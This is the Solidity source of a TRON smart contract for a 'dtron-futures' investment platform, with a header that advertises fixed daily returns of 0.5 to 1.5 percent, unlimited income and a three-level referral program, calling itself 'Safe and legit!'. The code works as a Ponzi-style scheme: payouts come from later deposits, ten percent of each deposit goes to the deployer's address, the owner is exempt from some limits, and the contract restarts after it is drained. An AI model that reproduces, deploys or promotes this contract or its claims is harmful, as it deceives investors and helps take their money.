//SourceUnit: dtron_futures.sol

/*
 * 
 *   dtron-futures.cc - investment platform based on TRX blockchain smart-contract technology. Safe and legit!
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐  
 *   │   Website: https://dtron-futures.cc                                   │
 *   │   Telegram Public Group: https://t.me/joinchat/Tog0whq3fzl9gJ6GpPSxuQ |
 *   └───────────────────────────────────────────────────────────────────────┘ 
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect TRON browser extension TronLink or TronMask, or mobile wallet apps like TronWallet or Banko.
 *   2) Send any TRX amount (200 TRX minimum) using our website invest button.
 *   3) Wait for your earnings.
 *   4) Withdraw earnings any time using our website "Withdraw" button.
 *
 *   [INVESTMENT CONDITIONS]
 * 
 *   - Minimum deposit: 200 TRX, no limit
 *   - 2 types of contracts:
 *     -- Locked Contract | 1.5% / day
 *        *-- Investment cannot be withdrawn
 *     -- Open Contract | 0.5% / day
 *        *-- Minimum investment hold: 1 day
 *        *-- You can withdraw your investment anytime
 *        *-- Penalty of 20% for early investment withdrawals
 *   - Total income: unlimited
 *   - Earnings every moment, withdraw any time
 * 
 *   [REFERRAL PROGRAM]
 *
 *   Share your referral link with your partners and get additional bonuses.
 *   - 3-level referral commission: 2.5% - 1.5% - 1%
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 90% Platform main balance, participants payouts
 *   - 5% Referral bonuses
 *   - 3% Advertising and promotion expenses
 *   - 2% Support work, technical functioning, administration fee
 *
 *   [ONLY CONTRACT UNIQUENESS]
 *
 *   - Contract will self-restart when funds are depleted.
 *   - Countdown will last 6 hrs.
 *
 *   ────────────────────────────────────────────────────────────────────────
 */

pragma solidity 0.5.9;

contract DTRON_FUTURES {

    struct Player {
        address upline;
        uint256 dividends;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        Deposit[] deposits;
        mapping(uint8 => uint256) structure;
    } 

    struct Deposit {
        uint8 tarif;
        uint256 amount;
        uint256 time;
		uint withdrawn;
    }

    struct Tarif {
        uint16 life_days;
        uint16 percent;
		uint256 value;
    }

    address payable public _self;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public direct_bonus;
    uint256 public match_bonus;
	
	uint public launch_date;
	uint public cooldown;
	uint public total_session;
    
    uint[] public ref_bonuses;

    Tarif[] public tarifs;
    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

	modifier restricted() {
		require(now >= launch_date || msg.sender == _self);
		_;
	}
	
    constructor() public {

        tarifs.push(Tarif(1, 25, 200)); // 2.5
        tarifs.push(Tarif(1, 15, 200)); // 1.5
        tarifs.push(Tarif(1, 15, 200)); // 1.5
        tarifs.push(Tarif(1, 5, 200)); // 0.5
        
        ref_bonuses.push(25);
        ref_bonuses.push(15);
        ref_bonuses.push(10);
		
		launch_date = 1602288000;
		cooldown = 43200; // 12 hrs
		
		total_session = 0;
        _self = msg.sender;
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = now;
            players[_addr].dividends += payout;
        }
    }

    function _payout_single(address _addr, uint _index) private {
        uint256 payout = this.payoutOf_single(_addr, _index);

        if(payout > 0) {
            players[_addr].dividends += payout;
			players[_addr].deposits[_index].withdrawn = payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / 1000;
			if(now < launch_date) {
				bonus = _amount * (ref_bonuses[i] + 25) / 1000;
			}
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != _self) {
            if(players[_upline].deposits.length == 0) {
                _upline = _self;
            }
            else {
                players[_addr].direct_bonus += _amount / 100;
                direct_bonus += _amount / 100;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Invalid Tier");
		if(_tarif <= 1) {
			require(now <= launch_date, "Expired Tier");
		}
		require(tarifs[_tarif].value <= msg.value, "Invalid Tier Value");

        Player storage player = players[msg.sender];

		if(_self != msg.sender) {
			require(player.deposits.length < 20, "Max 20 deposits per address");
		}

        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: (now > launch_date) ? now : launch_date,
			withdrawn: 0
        }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);

        _self.transfer(msg.value / 10);
        
        emit NewDeposit(msg.sender, msg.value, _tarif);
    }
    
    function withdraw() external restricted {
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.direct_bonus + player.match_bonus;

        player.dividends = 0;
        player.direct_bonus = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

		if(amount >= address(this).balance) {
			msg.sender.transfer(address(this).balance);
			launch_date = now + cooldown;
			total_session++;
		} else {
			msg.sender.transfer(amount);
		}
        
        emit Withdraw(msg.sender, amount);
    }
    
    function withdraw_single(uint _index) external restricted {
        Player storage player = players[msg.sender];

        _payout_single(msg.sender, _index);

        require(player.dividends > 0, "Zero amount");

        uint256 amount = player.dividends;

        player.dividends = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

		if(amount >= address(this).balance) {
			msg.sender.transfer(address(this).balance);
			launch_date = now + cooldown;
			total_session++;
		} else {
			msg.sender.transfer(amount);
		}
        
        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];
			if(dep.withdrawn == 0) {

				uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;

				if(from < now) {
					value += dep.amount * (now - from) * tarif.percent / 86400000;
				}
			}
        }

        return value;
    }

    function payoutOf_single(address _addr, uint _index) view external returns(uint256 value) {
        Player storage player = players[_addr];
		
		require(player.deposits[_index].time != 0 && player.deposits[_index].withdrawn == 0);

		Deposit storage dep = player.deposits[_index];
		Tarif storage tarif = tarifs[dep.tarif];

		uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;

		if(from < now) {
			value += dep.amount * (now - from) * tarif.percent / 86400000;
		}
		
		if(dep.time + 86400 > now && msg.sender != _self) {
			value += dep.amount * 80 / 100;
		} else {
			value += dep.amount;
		}

        return value;
    }

    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[3] memory structure, uint[6][100] memory deposits) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }
		
		for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;

            if(from < now && dep.withdrawn == 0) {
				deposits[i][2] = now;
                deposits[i][3] = dep.amount * (now - from) * tarif.percent / 86400000;
            } else {
				deposits[i][2] = 0;
				deposits[i][3] = 0;
			}
			
			deposits[i][0] = dep.tarif;
			deposits[i][1] = dep.amount;
			deposits[i][4] = dep.withdrawn;
			deposits[i][5] = dep.time;
        }

        return (
            payout + player.dividends + player.direct_bonus + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure,
			deposits
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _direct_bonus, uint256 _match_bonus, uint _launch_date) {
        return (invested, withdrawn, direct_bonus, match_bonus, launch_date);
    }
}